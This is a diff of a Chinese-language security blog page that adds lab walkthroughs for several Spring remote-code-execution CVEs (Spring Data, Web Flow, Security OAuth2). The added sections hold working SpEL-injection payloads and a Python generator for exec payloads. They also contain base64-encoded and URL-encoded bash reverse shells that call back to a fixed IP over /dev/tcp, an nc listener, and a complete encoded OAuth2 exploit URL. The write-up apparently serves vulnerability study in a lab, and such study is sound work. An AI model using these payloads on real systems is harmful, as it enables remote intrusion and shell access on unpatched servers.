@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.3k</span>
+            <span class="post-count">2.6k</span>
         </span>
     </span>
 
@@ -99,7 +99,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">7 分钟</span>
+            <span class="post-count">14 分钟</span>
         </span>
     </span>
 </div>
@@ -117,8 +117,7 @@
   <meta name="referrer" content="no-referrer"/>
 
 <h2 id="spring-Websocket-RCE-CVE-2018-1270"><a href="#spring-Websocket-RCE-CVE-2018-1270" class="headerlink" title="spring Websocket RCE(CVE-2018-1270)"></a>spring Websocket RCE(CVE-2018-1270)</h2><p>影响范围如⬇️：Spring Framework 4.3 - 4.3.15Spring Framework 5.0 - 5.0.5</p>
-<h3 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>url&#x2F;gs-guide-websocket<br><img src="https://img-blog.csdnimg.cn/1b2beb875de4447b9b098f8d1711d1bb.png" alt="789"></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>exp:</p>
+<h3 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>url&#x2F;gs-guide-websocket<br><img src="https://img-blog.csdnimg.cn/1b2beb875de4447b9b098f8d1711d1bb.png" alt="789"><br>exp:</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">
 <span class="token keyword">import</span> requests
 <span class="token keyword">import</span> random
@@ -198,7 +197,7 @@ sockjs<span class="token punctuation">.</span>send<span class="token punctuation
 <p><img src="https://img-blog.csdnimg.cn/3e294a607bba440aad29c99b3bcb6db7.png" alt="789"></p>
 <h2 id="Spring-Data-RCE-CVE-2018-1273"><a href="#Spring-Data-RCE-CVE-2018-1273" class="headerlink" title="Spring Data RCE(CVE-2018-1273)"></a>Spring Data RCE(CVE-2018-1273)</h2><p>影响范围如⬇️：Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10 (Ingalls SR10) Spring Data Commons 2.0 to 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
 <h3 id="漏洞指纹-1"><a href="#漏洞指纹-1" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>不是很明显，可能存在spring框架和数据库交互的地方（例如表单）</p>
-<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>主页面没有啥<br>使用目录扫描工具扫描到目录&#x2F;users，访问看看<br><img src="https://img-blog.csdnimg.cn/f0b8c2b4f54a4554a13d6966b1ba36d9.png" alt="132"><br>随便输入一点抓包<br><img src="https://img-blog.csdnimg.cn/b685efc72dc44c59a87a702f1d347a5f.png" alt="123"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>主页面没有啥<br>使用目录扫描工具扫描到目录&#x2F;users，访问看看<br><img src="https://img-blog.csdnimg.cn/f0b8c2b4f54a4554a13d6966b1ba36d9.png" alt="132"><br>随便输入一点抓包<br><img src="https://img-blog.csdnimg.cn/b685efc72dc44c59a87a702f1d347a5f.png" alt="123"></p>
 <p>改一下<br>使用dnslog测试一下</p>
 <p>POST:</p>
 <pre class="line-numbers language-none"><code class="language-none">POST &#x2F;users?page&#x3D;&amp;size&#x3D;5 HTTP&#x2F;1.1
@@ -257,7 +256,7 @@ username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().ex
   <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>看到json格式的返回值，说明这是一个Restful风格的api服务器<br>指纹就是网页全是json,里面有一些类</p>
-<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问&#x2F;customers&#x2F;1，符合漏洞指纹。<br><img src="https://img-blog.csdnimg.cn/31fee77b694e446b94dc0b35ec794cad.png" alt="465"></p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问&#x2F;customers&#x2F;1，符合漏洞指纹。<br><img src="https://img-blog.csdnimg.cn/31fee77b694e446b94dc0b35ec794cad.png" alt="465"></p>
 <p>PATCH的值是SpEL表达式，添加请求头为Content-Type：application&#x2F;json-patch+json ，而且命令需要改为10进制编码。</p>
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">PATCH /customers/1 HTTP/1.1
 Host: 8.130.100.154:8080
@@ -282,6 +281,46 @@ Content-Length: 468
 ]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里的十进制就是<code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
 <p>然后服务器监听端口，靶机这边再使用bp发送上述报文<br><img src="https://img-blog.csdnimg.cn/9aa440ec7c234562b7d533f45b55f0b2.png" alt="123"><br>发现成功反弹shell<br><img src="https://img-blog.csdnimg.cn/c05967577f1b42b98decea4522ce3e43.png" alt="123"></p>
+<h2 id="Spring-Web-Flow-RCE-CVE-2017-4971"><a href="#Spring-Web-Flow-RCE-CVE-2017-4971" class="headerlink" title="Spring Web Flow RCE(CVE-2017-4971)"></a>Spring Web Flow RCE(CVE-2017-4971)</h2><p>影响范围<br>Spring Web Flow 2.4.0 - 2.4.4<br>详细漏洞分析<a target="_blank" rel="noopener" href="https://paper.seebug.org/322/">Spring Web Flow 远程代码执行漏洞分析(CVE-2017-4971)</a></p>
+<h3 id="漏洞指纹-3"><a href="#漏洞指纹-3" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>无明显漏洞指纹，在各种提交表单的地方可以尝试</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>1、MvcViewFactoryCreator对象的useSpringBeanBinding参数需要设置为false（默认值） </li>
+<li>2、flow view 对象中设置BinderConfiguration对象为空</li>
+</ul>
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>随便登录一个账户，账号密码都已经给出<br><img src="https://img-blog.csdnimg.cn/15f73395f6ec4ae187a14ac8bf9cc982.png" alt="12"><br>登录之后随便进入一个房间<br><img src="https://img-blog.csdnimg.cn/b176f94d4f0e4299a75eff0f33298237.png" alt="123"><br>之后点击预定酒店(Book Hotel)<br>然后将信息随便完善一下<br><img src="https://img-blog.csdnimg.cn/4ccc00442da546639f1d0544b9f1a4e6.png" alt="456"><br>点击confirm，此时记得开启抓包，因为这里有csrf的token限制，所以重放是没有用的<br>先使用dnslog测试一下<br><img src="https://img-blog.csdnimg.cn/9d09a54848f540838c24075f2f941181.png" alt="123"><br> <img src="https://img-blog.csdnimg.cn/4670469add45474db6a6f9c04a5f022d.png" alt="123"></p>
+<p>反弹shell</p>
+<blockquote>
+<p><code>_eventId_confirm=&amp;_csrf=eed53409-7b2a-4b0e-b00b-27e6beb51aeb&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/8.130.100.154/80+0&gt;%261&quot;)).start()=vulhub</code><br>（记得这样url编码一下，不然反弹不成功，已经试过了。。。）<br><img src="https://img-blog.csdnimg.cn/14655ebd8e5d42c7b07d0bbd8d4fdfc7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/e8222bea59ba4ceda7ebd4dfcfbda40a.png" alt="123"></p>
+</blockquote>
+<h2 id="Spring-Security-OAuth2-RCE-CVE-2016-4977"><a href="#Spring-Security-OAuth2-RCE-CVE-2016-4977" class="headerlink" title="Spring Security OAuth2 RCE(CVE-2016-4977)"></a>Spring Security OAuth2 RCE(CVE-2016-4977)</h2><p>影响范围：<br>Spring Security OAuth 2.0 - 2.0.9<br>Spring Secutiry OAuth 1.0-1.0.5</p>
+<h3 id="漏洞指纹-4"><a href="#漏洞指纹-4" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>访问</p>
+<blockquote>
+<p>&#x2F;oauth&#x2F;authorize?response_type&#x3D;${2*2}&amp;client_id&#x3D;acme&amp;scope&#x3D;openid&amp;redirect_uri&#x3D;<a target="_blank" rel="noopener" href="http://test/">http://test</a></p>
+</blockquote>
+<p>存在登录页面<br>默认账号密码admin&#x2F;admin<br>然后回显这个画面 <img src="https://img-blog.csdnimg.cn/fabd0d40d6cb4ba5b54f44239db9a84e.png" alt="45"><br>说明就是存在漏洞<br>payload生成脚本</p>
+<pre class="line-numbers language-python3" data-language="python3"><code class="language-python3">#!&#x2F;usr&#x2F;bin&#x2F;env python
+
+message &#x3D; input(&#39;Enter message to encode:&#39;)
+
+poc &#x3D; &#39;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])
+
+for ch in message[1:]:
+   poc +&#x3D; &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch) 
+
+poc +&#x3D; &#39;)&#125;&#39;
+
+print(poc)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/f3f7fc1fe795429caa2737e39ad6afe9.png" alt="123"><br>复制一下结果并且拼接到这里<br><code>oauth/authorize?response_type=$&#123;POC&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code><br>发现无回显 <img src="https://img-blog.csdnimg.cn/fc8d3e0dde30449fb8fcd267f88faadd.png" alt="12"></p>
+<p>弹个shell试一试<br><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code><br><img src="https://img-blog.csdnimg.cn/f7b18d6679974a3191d4e86d142da821.png" alt="123"><br>服务器监听端口</p>
+<blockquote>
+<p>nc -lvnp 80</p>
+</blockquote>
+<p>payload</p>
+<blockquote>
+<p><code>http://8.130.100.154:8080/oauth/authorize?response_type=$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(85)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code></p>
+</blockquote>
+<p>反弹成功<br><img src="https://img-blog.csdnimg.cn/2a71fd763f72413d86ed417ce91832a0.png" alt="12"></p>
+<h2 id="Spring-Boot-目录遍历-CVE-2021-21234"><a href="#Spring-Boot-目录遍历-CVE-2021-21234" class="headerlink" title="Spring Boot 目录遍历(CVE-2021-21234)"></a>Spring Boot 目录遍历(CVE-2021-21234)</h2><h2 id="Spring-Data-MongoDB-SpEL-Expression-injection-CVE-2022-22980"><a href="#Spring-Data-MongoDB-SpEL-Expression-injection-CVE-2022-22980" class="headerlink" title="Spring Data MongoDB SpEL Expression injection(CVE-2022-22980)"></a>Spring Data MongoDB SpEL Expression injection(CVE-2022-22980)</h2><h2 id="Spring-Framework-RCE-CVE-2022-22965"><a href="#Spring-Framework-RCE-CVE-2022-22965" class="headerlink" title="Spring Framework RCE(CVE-2022-22965)"></a>Spring Framework RCE(CVE-2022-22965)</h2><h2 id="Spring-Cloud-Function-RCE-CVE-2022-22963"><a href="#Spring-Cloud-Function-RCE-CVE-2022-22963" class="headerlink" title="Spring Cloud Function RCE(CVE-2022-22963)"></a>Spring Cloud Function RCE(CVE-2022-22963)</h2><h2 id="Spring-Cloud-Gateway-RCE-CVE-2022-22947"><a href="#Spring-Cloud-Gateway-RCE-CVE-2022-22947" class="headerlink" title="Spring Cloud Gateway RCE(CVE-2022-22947)"></a>Spring Cloud Gateway RCE(CVE-2022-22947)</h2><h2 id="Spring-Actuator-未授权访问"><a href="#Spring-Actuator-未授权访问" class="headerlink" title="Spring Actuator 未授权访问"></a>Spring Actuator 未授权访问</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ZwTjUv7jemN7BWx72R9B-A">从0认识+识别+掌握spring全漏洞(1.8w字超详细看完拿捏spring)</a><br><img src="https://img-blog.csdnimg.cn/c05967577f1b42b98decea4522ce3e43.png" alt="123"></p>
  
       <!-- reward -->
       
@@ -364,6 +403,15 @@ Content-Length: 468
 
    
   <nav class="article-nav">
+    
+      <a href="/2023/11/27/2023%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            2023金盾信安杯初赛wp
+          
+        </div>
+      </a>
     
     
       <a href="/2023/11/17/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/" class="article-nav-link">
